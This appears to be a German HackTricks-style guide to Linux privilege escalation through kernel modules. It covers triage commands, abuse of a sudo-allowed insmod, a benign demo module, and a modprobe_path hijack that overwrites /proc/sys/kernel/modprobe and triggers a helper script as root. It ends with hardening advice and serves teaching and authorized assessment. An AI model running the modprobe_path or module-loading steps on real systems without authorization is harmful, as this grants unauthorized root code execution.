# Missbrauch von Kernel-Modulen und modprobe

{{#include ../../banners/hacktricks-training.md}}

## Fehlkonfigurationen bei Kernel-Modulen und dem Laden von Modulen

Die Unterstützung für Kernel-Module ist ein wichtiger Bereich bei der Überprüfung auf Linux privilege escalation. Behandle nicht jede Meldung zu unsignierten Modulen automatisch als ausnutzbar, sondern nutze sie, um praktische Fragen zu beantworten:

- Kann der aktuelle Benutzer Module über `sudo`, capabilities oder einen beschreibbaren Helper-Pfad laden?
- Ist das Laden von Modulen noch aktiviert?
- Ist die Erzwingung von Modul-Signaturen deaktiviert?
- Sind Modulverzeichnisse oder Moduldateien beschreibbar?
- Können Kernel-Logs gelesen werden, um zu bestätigen, was passiert ist?

Schnelle Triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretation:

- `modules_disabled=1` bedeutet, dass bis zum Neustart keine neuen Module geladen werden können.
- `module_sig_enforce=1` blockiert normalerweise nicht signierte Module.
- `dmesg_restrict=0` ermöglicht es nicht privilegierten Benutzern auf vielen Systemen, Kernel-Logs zu lesen.
- Schreibbare Pfade unter `/lib/modules/$(uname -r)/` sind gefährlich, da die Modulerkennung und das automatische Laden diesem Verzeichnis vertrauen können.

### Ein Modul laden und Kernel-Ausgaben lesen

Wenn du die legitime Berechtigung hast, ein lokales Modul zu laden, fügt `insmod` genau die von dir angegebene `.ko`-Datei ein. Die Init-Funktion des Moduls wird sofort ausgeführt, und mit `printk()` geschriebene Nachrichten erscheinen in den Kernel-Logs.

Minimaler Workflow für Review- oder Laborumgebungen:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Wenn `sudo -l` `insmod`, `modprobe` oder einen Wrapper darum erlaubt, ist dies als kritisch einzustufen:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-erlaubtes `insmod`

Eine sudo-Regel, die einem Benutzer erlaubt, `insmod` auszuführen, ist nicht damit vergleichbar, einen normalen administrativen Helfer zu erlauben. Der Initialisierungscode des Moduls wird sofort im Kernel-Kontext ausgeführt, sobald die `.ko` eingefügt wurde. Daher lautet die praktische Prüfungsfrage: „Kann dieser Benutzer das zu ladende Modul auswählen oder verändern?“

Generischer Prüfungsablauf:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Wenn der Benutzer ein beliebiges `.ko` bereitstellen kann, sollte dies bei einem autorisierten Assessment als vollständige Systemkompromittierung behandelt werden. Ein sichereres Vorgehen besteht darin, das Laden von Modulen nicht über sudo zu delegieren. Falls dies unvermeidbar ist, sollten der exakte Pfad, Eigentümer, Berechtigungen, die Signing policy und der Workflow zur Entfernung eingeschränkt werden.

Für ein harmloses Muster zum Erstellen von Modulen in einem kontrollierten Lab sehen ein minimaler Quellcode und ein Makefile wie folgt aus:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Nur in einem autorisierten Labor kompilieren und laden:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Prüfungen auf Missbrauch von `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` steuert das Userspace-Hilfsprogramm, das der Kernel aufruft, wenn er Unterstützung beim Laden von Modulen benötigt. Wenn ein Angreifer den Wert auf den Pfad eines beschreibbaren Executables ändern und ein unbekanntes Binärformat oder einen anderen Pfad zur Modulanforderung auslösen kann, kann dies zu Codeausführung als root führen.

Prüfe das aktuelle Hilfsprogramm:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Prüfe, ob du es beeinflussen kannst:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Generisches Muster nur für Labore:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Auf gehärteten Systemen sollte dies fehlschlagen, da unprivilegierte Benutzer nicht in `kernel.modprobe` schreiben können, der Pfad zum Hilfsprogramm nicht beschreibbar ist oder das Laden von Modulen blockiert wird.

### Überprüfung von beschreibbaren `/lib/modules`-Verzeichnissen

Beschreibbare Modulverzeichnisse können je nach späterem Aufruf von `modprobe` den Austausch von Modulen, das Platzieren schädlicher Module oder den Missbrauch des automatischen Ladens ermöglichen.

Überprüfe beschreibbare Speicherorte:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Wenn du beschreibbare Modulinhalte findest, prüfe, wie Module entdeckt werden:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Defensive Hinweise:

- Halte `/lib/modules` im Besitz von `root:root` und für Benutzer nicht beschreibbar.
- Setze `kernel.modules_disabled=1` nach dem Booten, sofern dies betrieblich möglich ist.
- Erzwinge die Signierung von Modulen auf Systemen, die ladbare Module benötigen.
- Überwache Schreibvorgänge nach `/proc/sys/kernel/modprobe` und `/lib/modules` sowie unerwartete Ausführungen von `insmod`/`modprobe`.

{{#include ../../banners/hacktricks-training.md}}
